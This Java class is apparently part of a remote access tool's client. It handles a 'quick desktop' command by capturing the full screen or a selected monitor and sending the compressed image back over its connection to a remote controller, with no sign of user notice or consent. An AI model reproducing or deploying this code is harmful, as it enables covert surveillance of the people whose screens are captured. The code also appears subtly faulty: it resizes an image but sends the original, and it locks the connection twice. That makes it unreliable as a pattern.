package com.redpois0n.packets;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import com.redpois0n.Connection;
import com.redpois0n.utils.ImageUtils;

public class PacketQUICKDESKTOP extends Packet {

	@Override
	public void read(String line) throws Exception {
		int width = Connection.readInt();
		int height = Connection.readInt();
		
		int monitor = Connection.readInt();
		
		BufferedImage image = null;
		Rectangle screenBounds = null;
		
		if (monitor == -1) {
			screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			image = new Robot().createScreenCapture(screenBounds);
		} else {
			GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
			Robot robotForScreen = new Robot(screen);  		
			screenBounds = screen.getDefaultConfiguration().getBounds();  
			screenBounds.x = 0;
			screenBounds.y = 0;
			image = robotForScreen.createScreenCapture(screenBounds);
		}
		
		BufferedImage resized = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
		resized.getGraphics().drawImage(image, 0, 0, width, height, null);
		
		byte[] buffer = ImageUtils.encodeImage(image, 0.1F);
		
		Connection.addToSendQueue(new PacketBuilder(Header.QUICK_DESKTOP));
		
		Connection.lock();	
		Connection.writeInt(buffer.length);
		Connection.dos.write(buffer);	
		Connection.lock();
	}

}
